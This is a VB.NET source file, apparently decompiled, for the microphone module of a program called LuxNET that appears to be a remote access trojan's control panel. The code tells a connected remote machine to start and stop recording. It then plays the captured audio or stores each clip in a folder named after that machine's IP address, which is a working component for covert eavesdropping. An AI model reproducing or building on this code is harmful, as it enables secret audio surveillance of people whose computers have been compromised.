Imports LuxNET.My
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports LuxNET.LuxNET

Public Class Microphone
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.count = 0
        Me.InitializeComponent()
    End Sub

    Private Sub btn_start_Click(sender As Object, e As EventArgs) Handles btn_start.Click
        Me.SendPacket(New Object() {CByte(&H19)})
        Me.btn_start.Enabled = False
        Me.btn_stop.Enabled = True
    End Sub

    Private Sub btn_stop_Click(sender As Object, e As EventArgs) Handles btn_stop.Click
        Me.SendPacket(New Object() {CByte(&H1A)})
        Me.btn_start.Enabled = True
        Me.btn_stop.Enabled = False
    End Sub
    Public Sub HandleRecording(ByVal byt As Byte())
        If Me.CheckBox1.Checked Then
            If Not MyProject.Computer.FileSystem.DirectoryExists(String.Format("{0}\Audio\", FileSystem.CurDir)) Then
                Directory.CreateDirectory(String.Format("{0}\Audio\", FileSystem.CurDir))
            End If
            If Not MyProject.Computer.FileSystem.DirectoryExists(String.Format("{0}\Audio\{1}\", FileSystem.CurDir, Me.client.EndPoint.Address.ToString)) Then
                Directory.CreateDirectory(String.Format("{0}\Audio\{1}\", FileSystem.CurDir, Me.client.EndPoint.Address.ToString))
            End If
            File.WriteAllBytes(String.Format("{0}\Audio\{1}\{2}.wav", FileSystem.CurDir, Me.client.EndPoint.Address.ToString, Me.count), byt)
            Me.count += 1
        Else
            File.WriteAllBytes((MyProject.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\rec.wav"), byt)
            MyProject.Computer.Audio.Play((MyProject.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\rec.wav"))
            File.Delete((MyProject.Computer.FileSystem.SpecialDirectories.Temp.ToString & "\rec.wav"))
        End If
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
    End Sub
    Public client As ServerClient
    Private count As Integer
    Private packer As LuxNET.Pack

    ' Nested Types
    Public Enum PacketHeaders As Byte
        ' Fields
        StartRecording = &H19
        StopRecording = &H1A
    End Enum
End Class